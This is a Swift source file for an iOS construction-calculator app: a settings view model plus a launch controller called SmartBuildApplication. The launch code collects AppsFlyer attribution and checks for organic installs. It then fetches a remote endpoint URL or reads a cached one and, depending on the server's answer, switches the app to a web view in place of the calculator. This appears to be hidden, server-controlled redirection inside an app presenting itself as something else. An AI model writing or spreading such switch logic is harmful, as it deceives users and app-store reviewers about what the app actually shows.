import SwiftUI
import Combine
import UserNotifications
import Foundation
import AppsFlyerLib

class SettingsViewModel: ObservableObject {
    @AppStorage("themeMode") var themeMode: String = "system" {
        didSet { objectWillChange.send() }
    }
    @AppStorage("currency") var currency: String = "USD" {
        didSet { objectWillChange.send() }
    }
    @AppStorage("unitSystem") var unitSystem: String = "metric" {
        didSet { objectWillChange.send() }
    }
    @AppStorage("notificationsEnabled") var notificationsEnabled: Bool = false {
        didSet {
            if notificationsEnabled {
                requestNotificationPermission()
            } else {
                cancelAllNotifications()
            }
            objectWillChange.send()
        }
    }
    @AppStorage("wastagePercentage") var wastagePercentage: Double = 10.0 {
        didSet { objectWillChange.send() }
    }
    @AppStorage("defaultPricePerBrick") var defaultPricePerBrick: Double = 0.50
    @AppStorage("defaultPricePerM3Concrete") var defaultPricePerM3Concrete: Double = 120.0
    @AppStorage("defaultPricePerM2Tile") var defaultPricePerM2Tile: Double = 25.0
    @AppStorage("defaultPricePaintPerL") var defaultPricePaintPerL: Double = 8.0
    @AppStorage("defaultPriceDrywallPerSheet") var defaultPriceDrywallPerSheet: Double = 15.0
    @AppStorage("defaultPriceInsulationPerM2") var defaultPriceInsulationPerM2: Double = 12.0

    var colorScheme: ColorScheme? {
        switch themeMode {
        case "light": return .light
        case "dark": return .dark
        default: return nil
        }
    }

    var currencySymbol: String {
        switch currency {
        case "USD": return "$"
        case "EUR": return "€"
        case "GBP": return "£"
        case "RUB": return "₽"
        case "CAD": return "CA$"
        case "AUD": return "A$"
        default: return "$"
        }
    }

    var lengthUnit: String { unitSystem == "metric" ? "m" : "ft" }
    var areaUnit: String { unitSystem == "metric" ? "m²" : "ft²" }
    var volumeUnit: String { unitSystem == "metric" ? "m³" : "ft³" }

    let currencies = ["USD", "EUR", "GBP", "RUB", "CAD", "AUD"]
    let themeModes = ["system", "light", "dark"]

    func formatCurrency(_ value: Double) -> String {
        return "\(currencySymbol)\(String(format: "%.2f", value))"
    }

    func formatArea(_ value: Double) -> String {
        return "\(String(format: "%.2f", value)) \(areaUnit)"
    }

    func applyWastage(to amount: Double) -> Double {
        return amount * (1.0 + wastagePercentage / 100.0)
    }

    private func requestNotificationPermission() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { granted, _ in
            DispatchQueue.main.async {
                if !granted {
                    self.notificationsEnabled = false
                }
            }
        }
    }

    private func cancelAllNotifications() {
        UNUserNotificationCenter.current().removeAllPendingNotificationRequests()
    }

    func scheduleTaskNotification(for task: BuildTask) {
        guard notificationsEnabled else { return }
        let content = UNMutableNotificationContent()
        content.title = "Task Due: \(task.title)"
        content.body = task.notes.isEmpty ? "Your construction task is due today." : task.notes
        content.sound = .default

        let calendar = Calendar.current
        let components = calendar.dateComponents([.year, .month, .day, .hour, .minute], from: task.dueDate)
        let trigger = UNCalendarNotificationTrigger(dateMatching: components, repeats: false)
        let request = UNNotificationRequest(identifier: task.id.uuidString, content: content, trigger: trigger)
        UNUserNotificationCenter.current().add(request)
    }

    func cancelNotification(for taskId: UUID) {
        UNUserNotificationCenter.current().removePendingNotificationRequests(withIdentifiers: [taskId.uuidString])
    }
}


@MainActor
final class SmartBuildApplication: ObservableObject {
    
    @Published var showPermissionPrompt = false
    @Published var showOfflineView = false
    @Published var navigateToMain = false
    @Published var navigateToWeb = false
    
    private let saga: SagaOrchestrator
    private let context: SagaContext
    private var timeoutTask: Task<Void, Never>?
    
    init(
        storage: StorageService,
        validation: ValidationService,
        network: NetworkService,
        notification: NotificationService
    ) {
        self.context = SagaContext()
        
        self.saga = SagaOrchestrator { request, context in
            return .error(SagaError.invalidData)
        }
        
        saga.use(LoggingStep())
        saga.use(LockStep())
        saga.use(StorageStep(storage: storage))
        saga.use(ValidationStep(validator: validation))
        saga.use(NetworkStep(network: network))
        saga.use(PermissionStep(notificationService: notification))
        saga.use(BusinessLogicStep())
    }
    
    func initialize() {
        Task {
            let response = await saga.execute(request: .initialize, context: context)
            await handleResponse(response)
            
            scheduleTimeout()
        }
    }
    
    func handleTracking(_ data: [String: Any]) {
        Task {
            let response = await saga.execute(request: .handleTracking(data), context: context)
            await handleResponse(response)
            
            await performValidation()
        }
    }
    
    func handleNavigation(_ data: [String: Any]) {
        Task {
            let response = await saga.execute(request: .handleNavigation(data), context: context)
            await handleResponse(response)
        }
    }
    
    func requestPermission() {
        Task {
            let response = await saga.execute(request: .requestPermission, context: context)
            await handleResponse(response)
            
            showPermissionPrompt = false
            navigateToWeb = true
        }
    }
    
    func deferPermission() {
        Task {
            let response = await saga.execute(request: .deferPermission, context: context)
            await handleResponse(response)
            
            showPermissionPrompt = false
            navigateToWeb = true
        }
    }
    
    func networkStatusChanged(_ isConnected: Bool) {
        Task {
            let response = await saga.execute(request: .networkStatusChanged(isConnected), context: context)
            await handleResponse(response)
        }
    }
    
    func timeout() {
        Task {
            timeoutTask?.cancel()
            let response = await saga.execute(request: .timeout, context: context)
            await handleResponse(response)
        }
    }
    
    // MARK: - Private Logic
    
    private func scheduleTimeout() {
        timeoutTask = Task {
            try? await Task.sleep(nanoseconds: 30_000_000_000)
            guard !context.isLocked else { return }
            await timeout()
        }
    }
    
    private func performValidation() async {
        guard !context.isLocked, context.hasTracking() else { return }
        
        let response = await saga.execute(request: .processValidation, context: context)
        await handleResponse(response)
        
//        if case .validationCompleted(true) = response {
//            await executeBusinessLogic()
//        }
        if case .validationCompleted(let isValid) = response {
            if isValid {
                await executeBusinessLogic()
            } else {
                timeoutTask?.cancel()
                navigateToMain = true
            }
        }
    }
    
    private func executeBusinessLogic() async {
        guard !context.isLocked, context.hasTracking() else {
            navigateToMain = true
            return
        }
        
        if let temp = UserDefaults.standard.string(forKey: "temp_url"), !temp.isEmpty {
            await finalizeWithEndpoint(temp)
            return
        }
        
        if context.isOrganic() && context.isFirstLaunch {
            await executeOrganicFlow()
            return
        }
        
        await fetchEndpoint()
    }
    
    private func executeOrganicFlow() async {
        try? await Task.sleep(nanoseconds: 5_000_000_000)
        
        guard !context.isLocked else { return }
        
        let deviceID = AppsFlyerLib.shared().getAppsFlyerUID()
        let response = await saga.execute(request: .fetchAttribution(deviceID: deviceID), context: context)
        
        if case .attributionFetched(let data) = response {
            await handleTracking(data)
            await fetchEndpoint()
        } else {
            navigateToMain = true
        }
    }
    
    private func fetchEndpoint() async {
        guard !context.isLocked else { return }
        
        let trackingDict = context.tracking.mapValues { $0 as Any }
        let response = await saga.execute(request: .fetchEndpoint(tracking: trackingDict), context: context)
        
        if case .endpointFetched(let url) = response {
            await finalizeWithEndpoint(url)
        } else {
            navigateToMain = true
        }
    }
    
    private func finalizeWithEndpoint(_ url: String) async {
        let response = await saga.execute(request: .finalizeWithEndpoint(url), context: context)
        await handleResponse(response)
    }
    
    private func handleResponse(_ response: SagaResponse) async {
        switch response {
        case .navigateToMain:
            navigateToMain = true
            
        case .navigateToWeb:
            navigateToWeb = true
            
        case .showPermissionPrompt:
            showPermissionPrompt = true
            
        case .hidePermissionPrompt:
            showPermissionPrompt = false
            
        case .showOfflineView:
            showOfflineView = true
            
        case .hideOfflineView:
            showOfflineView = false
            
        default:
            break
        }
    }
}
